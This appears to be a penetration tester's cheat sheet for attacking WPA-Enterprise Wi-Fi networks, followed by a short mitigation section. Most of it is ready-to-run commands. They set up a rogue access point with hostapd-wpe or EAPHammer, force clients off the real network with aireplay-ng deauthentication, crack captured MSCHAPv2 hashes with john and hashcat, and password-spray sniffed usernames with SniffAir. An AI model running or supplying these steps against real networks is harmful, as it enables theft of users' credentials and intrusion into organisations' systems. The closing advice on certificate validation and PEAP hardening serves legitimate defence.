For protocols such as EAP-MSCHAPv2 and EAP-TTLS it may be possible to set up a malicious access point which accepts EAP authentication, and if the device or user enters their credentials they can be captured. This is because these are password based authentication and the clients are not validating the server certificates. 

--------------------------------------------------
Attack with HostAPD-WPE  (older but more reliable)
--------------------------------------------------
Install HostAPD-wpe:
apt-get update
apt-get install hostapd-wpe

Modify the configuration (interface and ssid): 
/etc/hostapd-wpe/hostapd-wpe.conf

interface=<wlan0>
ssid= <same as corp network> 

Stop the network manager:
service network-manager stop
killall wpa_supplicant

Start Attack:
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

Deauth Clients from the network: 
aireplay-ng --deauth <#packets> -a <Network_Mac> wlan0


----------------------
Attack with EAPHammer: 
----------------------
Setup Attack AP: 
eaphammer -i wlan0 --channel <#> --auth wpa-eap --essid <SSID> --creds

Either deauth all clients:  (continues deauths forces client to you) 
airerplay-ng -0 100 -a <BSSID>  wlan0

or 

Deauth single client: (continues deauths forces client to you) 
airerplay-ng -0 100 -a <BSSID> -c <Client Mac>  wlan0


Crack the Captured Passwords: 
Crack the captured challenge/response password: (john)
john --wordlist=<dictionaryFile> <Capturedpasshash.txt>

Crack With Hashcat:
.\hashcat.exe -m 5500 .\wpeHash.txt ..\wordlists\rockyou.txt
.\hashcat.exe -m 5500 .\wpeHash.txt --show


Password Spraying Usernames:
------------------------------------
Usernames are seen in the clear via packet captures prior to authentication, these can be used in password spraying attacks below the lockout threshold much like other password spraying attacks on the network

Manual Process: 
	1. Run a packet capture
	2. Collect the usernames filtering for EAPOL and review reponse identity packet for usernames
	3. Spray with a few common weak password
	4. Wait an hour and try a couple more

Automate this attack with SniffAir: 
./sniffair.py
use Auto EAP
set Interface wlan0
set SSID TargeSSID
set Encryption PEAP
set Key Management WPA-EAP
set Password Summer2024
set Username File  /root/SniffAir/userlist.py
exploit

-------------------------------------------------
Mitigation could be using EAP-TLS but unlikely this is manageable by an organization with user certs:
- Check the Validate Server Certificates box
- Check Do not prompt the user to authorize new servers or trusted Certificate Authorities
- Check Enable Identity Privacy (type in anonymous and this will prevent usernames in the clear) 
-------------------------------------------------

If using PEAP the configuration can be hardened to prevent attacks such as Rogue Access Points, by ensuring only the expected certificates are trusted.

This can be done with Group Policy:

Computer Configuration → Policies → Windows Settings → Security Settings → Wireless Network (IEEE 802.11) Policies

In Protected EAP Properties select:

Trusted Root Certification Authorities: select just the relevant Root CA for the certificate in use
Connect to these servers: type the names of the servers as given in the certificate subject field
Select Do not prompt user to authorize new servers or trusted certification authorities
